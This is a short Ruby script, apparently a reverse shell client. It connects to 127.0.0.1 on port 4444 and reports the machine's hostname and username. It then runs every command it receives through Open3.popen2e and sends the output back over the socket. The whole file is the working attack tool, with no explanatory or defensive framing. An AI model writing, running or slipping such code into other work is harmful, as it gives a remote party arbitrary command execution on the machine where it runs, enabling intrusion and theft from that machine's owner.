require 'socket'
require 'open3'
def command_loop(socket)
	loop {
		command = socket.recv(1024)
		command = command.strip
		exit if command == 'exit'
		stdin, stdout_and_stderr, wait_thr = Open3.popen2e("#{command}")
		socket.print("#{stdout_and_stderr.readlines.join.chomp}\0")
	}
	rescue
		@socket.print("command does not exist\0")
		command_loop(@socket) 
end
def connect_to_host()
	hostname = '127.0.0.1'
	port = 4444
	@socket = TCPSocket.open(hostname, port)
	@socket.print("#{Socket.gethostname}\\#{ENV["USERNAME"]}\0")
	command_loop(@socket)
end
begin
	connect_to_host()
end
